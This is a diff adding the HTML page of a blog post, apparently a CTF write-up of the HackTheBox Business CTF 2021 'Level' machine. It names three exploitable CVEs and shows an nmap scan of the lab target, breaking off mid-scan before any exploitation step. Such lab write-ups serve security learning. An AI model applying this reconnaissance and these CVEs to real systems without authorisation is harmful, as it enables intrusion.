@@ -1,0 +1,1515 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HackTheBox Business CTF 2021 - Level (Fullpwn) | Tri Wanda Septian’s Blog</title>
+<meta name="description" content="Level is a fullpwn type challenge from HackTheBox Business CTF 2021. The vulnerabilities on target are Apache Flink Unauthenticated Arbitrary File Read,CVE-2020-17519, HorizontCMS 1.0.0-beta Shell Upload, CVE-2020-27387, MariaDB 10.2 /MySQL - &#39;wsrep_provider&#39; OS Command Execution ,CVE-2021-27928">
+
+
+  <meta name="author" content="Tri Wanda Septian">
+  
+  <meta property="article:author" content="Tri Wanda Septian">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Tri Wanda Septian's Blog">
+<meta property="og:title" content="HackTheBox Business CTF 2021 - Level (Fullpwn)">
+<meta property="og:url" content="http://localhost:4000/hackthebox/hackthebox%20business%20ctf%202021/ctf/htbbiz2021-level/">
+
+
+  <meta property="og:description" content="Level is a fullpwn type challenge from HackTheBox Business CTF 2021. The vulnerabilities on target are Apache Flink Unauthenticated Arbitrary File Read,CVE-2020-17519, HorizontCMS 1.0.0-beta Shell Upload, CVE-2020-27387, MariaDB 10.2 /MySQL - &#39;wsrep_provider&#39; OS Command Execution ,CVE-2021-27928">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-frame.png">
+
+
+
+  <meta name="twitter:site" content="@twseptian_">
+  <meta name="twitter:title" content="HackTheBox Business CTF 2021 - Level (Fullpwn)">
+  <meta name="twitter:description" content="Level is a fullpwn type challenge from HackTheBox Business CTF 2021. The vulnerabilities on target are Apache Flink Unauthenticated Arbitrary File Read,CVE-2020-17519, HorizontCMS 1.0.0-beta Shell Upload, CVE-2020-27387, MariaDB 10.2 /MySQL - &#39;wsrep_provider&#39; OS Command Execution ,CVE-2021-27928">
+  <meta name="twitter:url" content="http://localhost:4000/hackthebox/hackthebox%20business%20ctf%202021/ctf/htbbiz2021-level/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="http://localhost:4000/assets/images/htb-frame.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-07-26T00:00:00+07:00">
+
+
+
+  <meta property="article:modified_time" content="2021-07-27T01:58:26+07:00">
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/hackthebox/hackthebox%20business%20ctf%202021/ctf/htbbiz2021-level/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Tri Wanda Septian's Blog and Stuff",
+      "url": "http://localhost:4000/",
+      "sameAs": ["https://twitter.com/twsepian_","https://github.com/twseptian"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="KJV9Ip5Mlud9lmDhN6pzfrcplPaoPSnsaOptFO6aIwE" />
+
+
+  <meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3">
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Tri Wanda Septian's Blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+
+    <!-- start custom head snippets -->
+<meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3" />
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="120x120" href="/assets/images/favicon/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon/favicon-16x16.png">
+<link rel="manifest" href="/assets/images/favicon/site.webmanifest">
+<link rel="mask-icon" href="/assets/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/ava.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          Tri Wanda Septian
+          <span class="site-subtitle">#neverstoplearning #lifelonglearning</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/">posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/">about me</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+    
+    <aside class="sidebar__top">
+      <a href="#site-nav"><i class="fas fa-chevron-circle-up fa-2x"></i></a>
+      </aside>
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/avatar_backup.png" alt="Tri Wanda Septian" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Tri Wanda Septian</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Researcher, Infosec practioner,<br />CTF Player, Perpetual Learner.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Indonesia</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twseptian.github.io" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+          
+        
+          
+            <li><a href="mailto:twseptian@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/twseptian" rel="nofollow noopener noreferrer"><i class="fab fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://gitlab.com/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-gitlab" aria-hidden="true"></i><span class="label">GitLab</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/twseptian_" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HackTheBox Business CTF 2021 - Level (Fullpwn)">
+    <meta itemprop="description" content="Level is a fullpwn type challenge from HackTheBox Business CTF 2021. The vulnerabilities on target are Apache Flink Unauthenticated Arbitrary File Read,CVE-2020-17519, HorizontCMS 1.0.0-beta Shell Upload, CVE-2020-27387, MariaDB 10.2 /MySQL - &#39;wsrep_provider&#39; OS Command Execution ,CVE-2021-27928">
+    <meta itemprop="datePublished" content="2021-07-26T00:00:00+07:00">
+    <meta itemprop="dateModified" content="2021-07-27T01:58:26+07:00">
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HackTheBox Business CTF 2021 - Level (Fullpwn)
+</h1>
+          
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-07-26T00:00:00+07:00">July 26, 2021</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          14 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+
+          <section class="page__share">
+  
+    <!--<h4 class="page__share-title">Share on</h4>-->
+  
+
+  <a href="https://twitter.com/intent/tweet?via=twseptian_&text=HackTheBox+Business+CTF+2021+-+Level+%28Fullpwn%29%20http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2Fhackthebox%2520business%2520ctf%25202021%2Fctf%2Fhtbbiz2021-level%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2Fhackthebox%2520business%2520ctf%25202021%2Fctf%2Fhtbbiz2021-level%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2Fhackthebox%2520business%2520ctf%25202021%2Fctf%2Fhtbbiz2021-level%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a>
+  
+  <a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=☕&slug=twseptian&button_colour=5F7FFF&font_colour=ffffff&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="160",height="160"></a>
+</section>
+
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#network-scanning">Network Scanning</a></li>
+  <li><a href="#enumeration">Enumeration</a></li>
+  <li><a href="#gaining-access">Gaining Access</a></li>
+  <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <p>Level is a fullpwn type challenge from <a href="https://www.hackthebox.eu/htb-business-ctf-2021?utm_source=website&amp;utm_medium=banner&amp;utm_campaign=business_ctf">HackTheBox Business CTF 2021</a>. The vulnerabilities on target are <code class="language-plaintext highlighter-rouge">Apache Flink Unauthenticated Arbitrary File Read,CVE-2020-17519</code>, <code class="language-plaintext highlighter-rouge">HorizontCMS 1.0.0-beta Shell Upload, CVE-2020-27387</code>, <code class="language-plaintext highlighter-rouge">MariaDB 10.2 /MySQL - 'wsrep_provider' OS Command Execution ,CVE-2021-27928</code></p>
+
+<h1 id="network-scanning">Network Scanning</h1>
+<p>Let’s find all open ports on the target machine using nmap
+<code class="language-plaintext highlighter-rouge">sudo nmap -sC -sV -T4 -A -p- --vv 10.129.85.134 -oN nmap/nmap_level</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.91 scan initiated Mon Jul 26 20:36:29 2021 as: nmap -sC -sV -T4 -A -p- --vv -oN nmap/nmap_level 10.129.85.134</span>
+Increasing send delay <span class="k">for </span>10.129.85.134 from 0 to 5 due to 2516 out of 6289 dropped probes since last increase.
+Nmap scan report <span class="k">for </span>10.129.85.134
+Host is up, received echo-reply ttl 63 <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-07-26 20:36:29 WIB <span class="k">for </span>1422s
+Not shown: 65525 closed ports
+Reason: 65525 resets
+PORT      STATE SERVICE          REASON         VERSION
+22/tcp    open  ssh              syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 <span class="o">(</span>RSA<span class="o">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1FohcrXkoPYUOtmzAh5PlCU2H0+sFcGl6XXS6vX2lLJ3RD2Vd+KlcYtc2wQLjcYJhkFe793jmkogOSh0uI+fKQA9z1Ib3J0vtsIaNkXxvSMPcr54QxXgg1guaM1OQl43ePUADXnB6WqAg8QyF6Nxoa18vboOAu3a8Wn9Qf9iCpoU93d5zQj+FsBKVaDs3zuJkUBRfjsqq7rEMpxqCfkFIeUrJF9MBsQhgsEVUbo1zicWG32m49PgDbKr9yE3lPsV9K4b9ugNQ3zwWW5a1OpOs+r3AxFcu2q65N2znV3/p41ul9+fWXo9pm0jJPJ3V5gZphDkXVZEw16K2hcgQcQJUH7luaVTRpzqDxXaiK/8wChtMXEUjFQKL6snEskkRxCg+uLO6HjI19dJ7sTBUkjdMK58TM5RmK8EO1VvbCAAdlMs8G064pSFKxY/iQjp7VWuaqBUetpplESpIe6Bz+tOyTJ8ZyhkJimFG80iHoKWYI2TOa5FdlXod1NvTIkCLD2U<span class="o">=</span>
+|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD+SiHX7ZTaXWFgBUKSVlFmMYtqF7Ihjfdc51aEdxFdB3xnRWVYSJd2JhOX1k/9V62eZMhR/4Lc8pJWQJHdSA/c<span class="o">=</span>
+|   256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXLlJgua8pjAw5NcWgGDwXoASfUOqUlpeQxd66seKyT
+80/tcp    open  ssl/http?        syn-ack ttl 63
+| http-methods: 
+|_  Supported Methods: POST
+3306/tcp  open  mysql?           syn-ack ttl 63
+| mysql-info: 
+|_  MySQL Error: Host <span class="s1">'10.10.14.172'</span> is not allowed to connect to this MariaDB server
+|_ssl-cert: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_ssl-date: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_sslv2: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_tls-alpn: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_tls-nextprotoneg: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+6123/tcp  open  spark            syn-ack ttl 63 Apache Spark
+8081/tcp  open  blackice-icecap? syn-ack ttl 63
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Content-Type: application/json<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+|     content-length: 74
+|     <span class="o">{</span><span class="s2">"errors"</span>:[<span class="s2">"Unable to load requested file /nice ports,/Trinity.txt.bak."</span><span class="o">]}</span>
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Content-Type: text/html
+|     Date: Mon, 26 Jul 2021 14:02:04 GMT
+|     Expires: Mon, 26 Jul 2021 14:07:04 GMT
+|     Cache-Control: private, max-age<span class="o">=</span>300
+|     Last-Modified: Mon, 26 Jul 2021 14:02:04 GMT
+|     content-length: 2137
+|     &lt;<span class="o">!</span><span class="nt">--</span>
+|     Licensed to the Apache Software Foundation <span class="o">(</span>ASF<span class="o">)</span> under one
+|     more contributor license agreements. See the NOTICE file
+|     distributed with this work <span class="k">for </span>additional information
+|     regarding copyright ownership. The ASF licenses this file
+|     under the Apache License, Version 2.0 <span class="o">(</span>the
+|     <span class="s2">"License"</span><span class="o">)</span><span class="p">;</span> you may not use this file except <span class="k">in </span>compliance
+|     with the License. You may obtain a copy of the License at
+|     http://www.apache.org/licenses/LICENSE-2.0
+|     Unless required by applicable law or agreed to <span class="k">in </span>writing, software
+|     distributed under the License is distributed on an <span class="s2">"AS IS"</span> BASIS,
+|     WITHOUT WARRANTIES OR CONDITIONS OF
+|   SIPOptions: 
+|     HTTP/1.1 404 Not Found
+|     Content-Type: application/json<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+|     Access-Control-Allow-Origin: <span class="k">*</span>
+|     Connection: keep-alive
+|     content-length: 25
+|     <span class="o">{</span><span class="s2">"errors"</span>:[<span class="s2">"Not found."</span><span class="o">]}</span>
+|   WWWOFFLEctrlstat: 
+|     HTTP/1.1 404 Not Found
+|     Content-Type: application/json<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+|     content-length: 58
+|_    <span class="o">{</span><span class="s2">"errors"</span>:[<span class="s2">"Unable to load requested file /bad-request."</span><span class="o">]}</span>
+|_mcafee-epo-agent: ePO Agent not found
+34655/tcp open  printer          syn-ack ttl 63
+39845/tcp open  spark            syn-ack ttl 63 Apache Spark
+41129/tcp open  spark            syn-ack ttl 63 Apache Spark
+46431/tcp open  spark            syn-ack ttl 63 Apache Spark
+46613/tcp open  unknown          syn-ack ttl 63
+| fingerprint-strings: 
+|   Kerberos: 
+|     Forg.apache.flink.shaded.netty4.io.netty.handler.codec.DecoderException<span class="sb">`</span> 
+|     Dorg.apache.flink.shaded.netty4.io.netty.handler.codec.CodecException
+|     java.lang.RuntimeException
+|     java.lang.Exception
+|     java.lang.Throwable
+|     5<span class="s1">'9w
+|     causet
+|     Ljava/lang/Throwable;L
+|     detailMessaget
+|     Ljava/lang/String;[
+|     stackTracet
+|     [Ljava/lang/StackTraceElement;L
+|     suppressedExceptionst
+|     Ljava/util/List;xpsr
+|     java.lang.IllegalStateException
+|     :Network stream corrupted: received incorrect magic number.ur
+|     [Ljava.lang.StackTraceElement;
+|     F*&lt;&lt;
+|     java.lang.StackTraceElementa 
+|     formatI
+|     lineNumberL
+|     classLoaderNameq
+|     declaringClassq
+|     fileNameq
+|     methodNameq
+|     moduleNameq
+|     moduleVersionq
+|     appt
+|     Jorg.apache.flink.runtime.io.network.netty.NettyMessage$NettyMessageDecodert
+|     NettyMe
+|   RPCCheck: 
+|     Korg.apache.flink.shaded.netty4.io.netty.handler.codec.TooLongFrameException
+|     Forg.apache.flink.shaded.netty4.io.netty.handler.codec.DecoderException` 
+|     Dorg.apache.flink.shaded.netty4.io.netty.handler.codec.CodecException
+|     java.lang.RuntimeException
+|     java.lang.Exception
+|     java.lang.Throwable
+|     5'</span>9w
+|     causet
+|     Ljava/lang/Throwable<span class="p">;</span>L
+|     detailMessaget
+|     Ljava/lang/String<span class="p">;</span><span class="o">[</span>
+|     stackTracet
+|     <span class="o">[</span>Ljava/lang/StackTraceElement<span class="p">;</span>L
+|     suppressedExceptionst
+|     Ljava/util/List<span class="p">;</span>xpq
+|     @Adjusted frame length exceeds 2147483647: 2147483688 - discardedur
+|     <span class="o">[</span>Ljava.lang.StackTraceElement<span class="p">;</span>
+|     F<span class="k">*</span>&lt;&lt;
+|     java.lang.StackTraceElementa 
+|     formatI
+|     lineNumberL
+|     classLoaderNameq
+|     declaringClassq
+|     fileNameq
+|     methodNameq
+|     moduleNameq
+|     moduleVersionq
+|     appt
+|_    Rorg.apache.flink.shaded.netty4.io.netty.
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+SF-Port8081-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>7/26%Time<span class="o">=</span>60FEBEDD%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>Ge
+SF:tRequest,93B,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/html</span><span class="se">\r\n</span><span class="s2">D
+SF:ate:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2026</span><span class="se">\x</span><span class="s2">20Jul</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2014:02:04</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Expires:</span><span class="se">\x</span><span class="s2">20Mon
+SF:,</span><span class="se">\x</span><span class="s2">2026</span><span class="se">\x</span><span class="s2">20Jul</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2014:07:04</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Cache-Control:</span><span class="se">\x</span><span class="s2">20private,
+SF:</span><span class="se">\x</span><span class="s2">20max-age=300</span><span class="se">\r\n</span><span class="s2">Last-Modified:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2026</span><span class="se">\x</span><span class="s2">20Jul</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2014:02
+SF::04</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">content-length:</span><span class="se">\x</span><span class="s2">202137</span><span class="se">\r\n\r\n</span><span class="s2">&lt;!--</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20~</span><span class="se">\x</span><span class="s2">20License
+SF:d</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20the</span><span class="se">\x</span><span class="s2">20Apache</span><span class="se">\x</span><span class="s2">20Software</span><span class="se">\x</span><span class="s2">20Foundation</span><span class="se">\x</span><span class="s2">20</span><span class="se">\(</span><span class="s2">ASF</span><span class="se">\)\x</span><span class="s2">20under</span><span class="se">\</span><span class="s2">
+SF:x20one</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20~</span><span class="se">\x</span><span class="s2">20or</span><span class="se">\x</span><span class="s2">20more</span><span class="se">\x</span><span class="s2">20contributor</span><span class="se">\x</span><span class="s2">20license</span><span class="se">\x</span><span class="s2">20agreements
+SF:</span><span class="se">\.\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20See</span><span class="se">\x</span><span class="s2">20the</span><span class="se">\x</span><span class="s2">20NOTICE</span><span class="se">\x</span><span class="s2">20file</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20~</span><span class="se">\x</span><span class="s2">20distributed</span><span class="se">\x</span><span class="s2">20wit
+SF:h</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20work</span><span class="se">\x</span><span class="s2">20for</span><span class="se">\x</span><span class="s2">20additional</span><span class="se">\x</span><span class="s2">20information</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20~</span><span class="se">\x</span><span class="s2">20reg
+SF:arding</span><span class="se">\x</span><span class="s2">20copyright</span><span class="se">\x</span><span class="s2">20ownership</span><span class="se">\.\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20The</span><span class="se">\x</span><span class="s2">20ASF</span><span class="se">\x</span><span class="s2">20licenses</span><span class="se">\x</span><span class="s2">20thi
+SF:s</span><span class="se">\x</span><span class="s2">20file</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20~</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20you</span><span class="se">\x</span><span class="s2">20under</span><span class="se">\x</span><span class="s2">20the</span><span class="se">\x</span><span class="s2">20Apache</span><span class="se">\x</span><span class="s2">20License,
+SF:</span><span class="se">\x</span><span class="s2">20Version</span><span class="se">\x</span><span class="s2">202</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20</span><span class="se">\(</span><span class="s2">the</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20~</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">License</span><span class="se">\"\)</span><span class="s2">;</span><span class="se">\x</span><span class="s2">20you</span><span class="se">\x</span><span class="s2">20may
+SF:</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20use</span><span class="se">\x</span><span class="s2">20this</span><span class="se">\x</span><span class="s2">20file</span><span class="se">\x</span><span class="s2">20except</span><span class="se">\x</span><span class="s2">20in</span><span class="se">\x</span><span class="s2">20compliance</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20~
+SF:</span><span class="se">\x</span><span class="s2">20with</span><span class="se">\x</span><span class="s2">20the</span><span class="se">\x</span><span class="s2">20License</span><span class="se">\.\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20You</span><span class="se">\x</span><span class="s2">20may</span><span class="se">\x</span><span class="s2">20obtain</span><span class="se">\x</span><span class="s2">20a</span><span class="se">\x</span><span class="s2">20copy</span><span class="se">\x</span><span class="s2">
+SF:20of</span><span class="se">\x</span><span class="s2">20the</span><span class="se">\x</span><span class="s2">20License</span><span class="se">\x</span><span class="s2">20at</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20~</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20~</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20h
+SF:ttp://www</span><span class="se">\.</span><span class="s2">apache</span><span class="se">\.</span><span class="s2">org/licenses/LICENSE-2</span><span class="se">\.</span><span class="s2">0</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20~</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20~</span><span class="se">\x</span><span class="s2">20U
+SF:nless</span><span class="se">\x</span><span class="s2">20required</span><span class="se">\x</span><span class="s2">20by</span><span class="se">\x</span><span class="s2">20applicable</span><span class="se">\x</span><span class="s2">20law</span><span class="se">\x</span><span class="s2">20or</span><span class="se">\x</span><span class="s2">20agreed</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20i
